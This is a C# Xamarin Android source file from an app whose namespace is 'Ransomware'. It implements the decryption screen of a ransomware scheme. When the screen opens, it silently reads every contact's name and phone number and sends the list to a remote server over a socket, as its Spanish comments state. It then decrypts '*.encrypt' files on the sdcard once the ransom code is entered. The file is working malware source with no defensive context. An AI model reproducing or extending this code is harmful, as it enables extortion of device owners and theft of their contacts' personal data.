using System.Collections.Generic;
using System.IO;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Provider;
using Android.Widget;
using Ransomware.DecryptFiles;

namespace Ransomware
{
    [Activity(Label = "decrypt_act")]
    public class decrypt_act : Activity
    {
        List<ContactData> data;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);

            // Create your application here
            SetContentView(Resource.Layout.decrypt_activity);

            EditText code = FindViewById<EditText>(Resource.Id.editText1);
            Button dec = FindViewById<Button>(Resource.Id.button1);
            //si el code que envia el MainActivity contiene la clave la mostrara
            string pass = Intent.GetStringExtra("code");
            if(pass.Length < 1)
            {
                code.Text = "";
            }
            else
            {
                code.Text = pass;
            }
            //obtener contactos
            data = GetContacts();
            //Envia la lista de contactos al servidor
            SocketClient.Client.Conectar(data);

            dec.Click += delegate
            {
                if(code.Text == "")
                {
                    AlertDialog.Builder alert = new AlertDialog.Builder(this);
                    alert.SetTitle("ERROR");
                    alert.SetMessage("ERROR: Inserte Codigo");
                    alert.SetNegativeButton("OK", (senderAlert, args) =>
                    {

                    });

                    Dialog dialog = alert.Create();
                    dialog.Show();
                }
                string[] files = Directory.GetFiles(@"sdcard", "*.encrypt", SearchOption.AllDirectories);
                Decrypt.CreateKey(code.Text);
                if (files.Length < 1)
                {
                    AlertDialog.Builder alert = new AlertDialog.Builder(this);
                    alert.SetTitle("ERROR");
                    alert.SetMessage("ERROR: No se encuentran archivos cifrados");
                    alert.SetNegativeButton("ok", (senderAlert, args) =>
                    {
                        
                    });

                    Dialog dialog = alert.Create();
                    dialog.Show();

                }
                foreach (var f in files)
                {
                        Decrypt.DecryptFile(f);
                }
                Toast.MakeText(this, "Archivos decifrados!", ToastLength.Long).Show();
            };
        }
        /// <summary>
        /// info: https://developer.xamarin.com/guides/android/platform_features/intro_to_content_providers/contacts-contentprovider/
        /// Obtenemos los contactos y se guardan en una lista de objetos.
        /// </summary>
        public List<ContactData> GetContacts()
        {
            var uri = ContactsContract.CommonDataKinds.Phone.ContentUri;
            string[] projection = {
                ContactsContract.Contacts.InterfaceConsts.Id,
                ContactsContract.Contacts.InterfaceConsts.DisplayName,
                ContactsContract.CommonDataKinds.Phone.Number};

            var cursor = ContentResolver.Query(uri, projection, null, null, null);
            int projCount = projection.Length;
            List<ContactData> contactList = new List<ContactData>();
            if (cursor.MoveToFirst())
            {
                string pass = Intent.GetStringExtra("code");
                do
                {
                    ContactData contact = new ContactData();
                    contact.id = pass;
                    contact.name = cursor.GetString(cursor.GetColumnIndex(projection[1]));
                    contact.phone = cursor.GetString(cursor.GetColumnIndex(projection[2]));
                    contactList.Add(contact);
                } while (cursor.MoveToNext());

            }
            return contactList;
        }
    }
}